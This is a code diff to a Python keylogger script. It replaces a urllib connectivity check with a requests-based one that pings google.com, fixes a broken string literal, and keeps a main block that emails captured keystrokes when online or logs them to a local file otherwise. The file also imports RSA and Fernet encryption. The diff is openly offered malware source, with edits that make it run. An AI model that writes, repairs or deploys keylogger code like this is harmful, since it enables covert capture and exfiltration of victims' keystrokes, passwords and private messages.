@@ -8,7 +8,7 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from cryptography.fernet import Fernet
-import urllib.request
+import requests
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
@@ -145,18 +145,18 @@ class Keylogger:
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
         
-   def connect(host='http://google.com'):
-        try:
-            urllib.request.urlopen(host)
-            return True
-        except:
-            return False
+def connect(url='http://www.google.com/', timeout=5):
+    try:
+      response = requests.get(url, timeout=timeout)
+      return True
+    except requests.ConnectionError:
+      return False
 
         
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
     if connect():
-        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email)
+        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
                               
     # if you want a keylogger to record keylogs to a local file                          
     else:
